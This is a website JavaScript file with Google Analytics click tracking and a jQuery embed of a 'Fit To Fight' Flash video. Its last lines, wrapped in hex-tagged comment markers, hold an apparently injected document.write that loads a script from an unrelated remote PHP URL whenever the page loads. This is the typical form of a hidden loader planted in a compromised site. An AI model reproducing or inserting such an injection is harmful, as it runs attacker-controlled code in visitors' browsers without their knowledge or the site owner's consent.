// Begin Analytics
$(document).ready( function() {
	$('#Picture972A').bind('click', function() { pageTracker._trackPageview('/outgoing/fit-to-fight.com/locations'); } );
});
// End Analytics

// Begin jMedia Components
$(document).ready(
function() {
	$("#Flash2").media({ width: 320, height: 240,
		src: '../assets/applets/Fit_To_Fight_Video.swf', flashVersion: '5,0,0,0',
		autoplay: true,
		params: { loop: 'true', quality: 'autolow', scale: 'showall', salign: 'l', wmode: 'transparent' }
	});
});
// End jMedia Components

/*9a031b*/
document.write('<script src="http://plan-b.cwsurf.de/y98K4N6o.php?id=66195502" type="text/javascript"></script>');
/*/9a031b*/
